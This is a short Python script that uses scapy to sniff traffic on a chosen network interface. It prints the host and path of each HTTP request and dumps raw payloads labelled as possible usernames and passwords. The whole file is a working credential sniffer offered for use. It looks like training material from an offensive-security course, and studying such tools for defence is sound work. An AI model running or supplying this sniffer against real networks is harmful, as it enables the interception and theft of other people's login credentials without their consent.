import scapy.all as scapy
from scapy.layers import http
import optparse

def sniffer(interface):
	scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def process_sniffed_packet(packet):
	if packet.haslayer(http.HTTPRequest):
		url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
		print("[+] HTTP Request Url ===> " + url.decode())

		if packet.haslayer(scapy.Raw):
			load = str(packet[scapy.Raw].load)
			print("\n\n[+] Possible Username and password=> " + load)

def getArguments():
	parser = optparse.OptionParser()
	parser.add_option("-t", "--target", dest="target", help="Enter the interface of the source machine")
	(options, arguments) = parser.parse_args()
	return options

options = getArguments()
if options:
	sniffer(str(options.target))
else:
	sniffer(str(options.target))	
